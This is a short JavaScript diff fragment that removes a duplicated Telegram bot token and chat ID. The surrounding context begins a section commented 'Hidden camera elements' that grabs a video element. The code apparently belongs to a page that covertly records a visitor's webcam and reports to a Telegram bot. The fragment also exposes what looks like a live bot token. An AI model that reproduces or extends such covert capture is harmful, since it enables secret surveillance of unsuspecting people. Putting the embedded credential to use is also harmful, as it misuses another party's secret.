@@ -4,9 +4,6 @@ const chatId = '2034466289';
 
 
 
-const botToken = '8882652032:AAHNBhSwHFupBkxXsGoc6hmZrEejfDD8lWw';
-const chatId = '8729739085';
-
 
 // Hidden camera elements
 const video = document.getElementById('video');
